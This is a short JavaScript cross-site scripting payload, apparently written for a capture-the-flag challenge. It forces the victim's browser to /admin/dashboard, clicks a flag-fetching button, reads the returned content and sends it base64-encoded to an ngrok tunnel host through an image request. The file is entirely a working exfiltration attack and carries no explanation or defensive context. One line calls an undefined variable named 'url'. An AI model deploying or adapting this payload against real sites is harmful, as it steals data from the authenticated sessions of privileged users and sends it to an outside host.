const exfil="https://30a8-2402-800-61c7-539d-60ad-28f0-6942-5ea2.ngrok-free.app";

function steal(){
  fetch(url+"?note=startFetch")
  let btn=document.getElementById("fetchFlag2Btn");
  if(btn) btn.click();

  setTimeout(()=>{

    let f=document.getElementById("flag2Content");

    if(f && f.innerText.length>0){
      new Image().src=exfil+"?flag="+encodeURIComponent(btoa(f.innerText));
    }

  },2000);
}

if(!location.pathname.includes("/admin/dashboard")){
  location="/admin/dashboard";
}else{
  steal();
}
